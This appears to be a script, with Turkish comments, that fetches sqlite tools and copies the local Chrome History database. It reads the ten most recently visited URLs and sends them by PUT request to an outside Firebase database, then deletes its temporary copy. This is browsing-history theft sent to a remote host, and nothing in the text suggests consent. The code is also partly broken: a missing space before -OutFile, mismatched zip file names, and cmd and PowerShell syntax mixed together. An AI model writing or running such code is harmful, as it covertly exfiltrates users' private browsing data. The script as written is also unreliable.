powershell -Command "Invoke-WebRequest https://www.sqlite.org/2025/sqlite-tools-win-x64-3490100.zip-OutFile %TEMP%\sqlite.zip"
powershell -Command "Expand-Archive %TEMP%\sqlite-tools-win-x64-3490100.zip -DestinationPath %TEMP%\sqlitebin"
set PATH=%PATH%;%TEMP%\sqlitebin

# config
$firebaseUrl = "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/history.json"

# Chrome geçmiş dosyasının yolu
$historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempPath = "$env:TEMP\temp_history.db"

# Geçmiş dosyasını geçici klasöre kopyala
Copy-Item -Path $historyPath -Destination $tempPath -Force

# Son 10 ziyaret edilen domaini al
$urls = & {
    sqlite3.exe $tempPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 10;" 2>&1
}

# JSON formatına çevir
$data = @{ visited = $urls } | ConvertTo-Json -Depth 2

# Firebase’e gönder
Invoke-RestMethod -Uri $firebaseUrl -Method PUT -Body $data

# Temizlik
Remove-Item $tempPath -Force
